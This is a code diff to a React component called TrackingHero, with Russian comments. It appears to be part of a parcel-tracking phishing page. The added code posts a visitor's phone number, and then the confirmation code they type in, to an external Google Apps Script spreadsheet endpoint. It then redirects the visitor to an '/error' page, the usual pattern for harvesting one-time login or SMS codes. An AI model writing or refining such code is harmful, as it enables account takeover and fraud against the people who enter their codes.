@@ -11,27 +11,68 @@ export default function TrackingHero() {
   const router = useRouter();
 
   // Открываем модалку
-  const handleSubmit = () => {
+  // внутри компонента
+  const [rowIndex, setRowIndex] = useState(null);
+
+  const handleSubmit = async () => {
     if (!phone.trim()) return alert("Введите номер телефона");
-    setIsModalOpen(true);
+
+    // 1) отправляем телефон в AppsScript → получаем rowIndex
+    try {
+      const resp = await fetch(
+        "https://script.google.com/macros/s/AKfycbwlCOUQnlaXELnnAnQL42DGTqqdiNaz7a16_g2_056ZH95pkUDTPUZ52KGG5lTMNgi7LA/exec",
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            _secret: "YOUR_SECRET_TOKEN",
+            action: "addPhone",
+            phone,
+          }),
+        }
+      );
+      const data = await resp.json();
+      if (!data.success) throw new Error(data.error || "Error");
+      setRowIndex(data.row); // сохраняем индекс строки
+      setIsModalOpen(true);
+    } catch (err) {
+      if (err instanceof Error) {
+        alert("Не удалось сохранить телефон: " + err.message);
+      } else {
+        alert("Не удалось сохранить телефон");
+      }
+    }
   };
 
   // Подтверждение кода → отправка в таблицу → редирект
   const handleConfirm = async () => {
     if (code.length < 3) return alert("Введите корректный код");
 
-    // 👉 Сохраняем данные в таблицу
-    await fetch("/api/save-phone", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ phone, code}),
-    });
-
-    // 👉 Закрываем модалку
-    setIsModalOpen(false);
-
-    // 👉 Переход
-    router.push(`/error`);
+    try {
+      const resp = await fetch(
+        "https://script.google.com/macros/s/AKfycbwlCOUQnlaXELnnAnQL42DGTqqdiNaz7a16_g2_056ZH95pkUDTPUZ52KGG5lTMNgi7LA/exec",
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            _secret: "YOUR_SECRET_TOKEN",
+            action: "appendCode",
+            row: rowIndex, // либо phone: phone
+            code,
+          }),
+        }
+      );
+      const data = await resp.json();
+      if (!data.success) throw new Error(data.error || "Error");
+      setIsModalOpen(false);
+      router.push("/error");
+    } catch (err) {
+      if (err instanceof Error) {
+        alert("Не удалось сохранить телефон: " + err.message);
+      } else {
+        alert("Не удалось сохранить телефон");
+      }
+    }
   };
 
   return (
